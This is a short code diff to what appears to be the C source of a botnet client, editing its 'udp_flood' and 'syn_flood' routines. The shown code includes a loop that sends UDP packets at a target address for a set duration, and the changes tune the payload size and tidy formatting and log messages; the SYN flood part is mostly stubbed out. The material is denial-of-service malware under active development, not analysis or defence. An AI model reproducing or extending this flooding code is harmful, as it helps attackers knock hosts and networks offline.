@@ -46,6 +46,8 @@
 
 #include "bot.h"
 
+#define MAX_UDP_PAYLOAD 512
+
 /*
  * generic udp flood
  * max packet data
@@ -65,7 +67,7 @@ void *udp_flood (void *args) {
     thr_args *ta = (thr_args *)args;
 
     int err;
-    char payload[65000];
+    char payload[MAX_UDP_PAYLOAD];
 
     // set up connection data
     SOCKET target_s;
@@ -101,7 +103,8 @@ void *udp_flood (void *args) {
 
     int start_time = time (NULL);
     while (time (NULL) - start_time < ta->time) {
-        err = sendto (target_s, payload, payload_len, 0, res->ai_addr, res->ai_addrlen);
+        err = sendto (target_s, payload, payload_len, 0, 
+                        res->ai_addr, res->ai_addrlen);
         if (err == -1) {
             return NULL;
         }
@@ -137,7 +140,7 @@ void *syn_flood (void *args) {
     printf ("Executing SYN\n");
     //thr_args *ta = (thr_args *)args;
 
-    puts ("exiting thread");
+    puts ("exiting flood thread");
 #if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
 
     //closesocket (target_s);
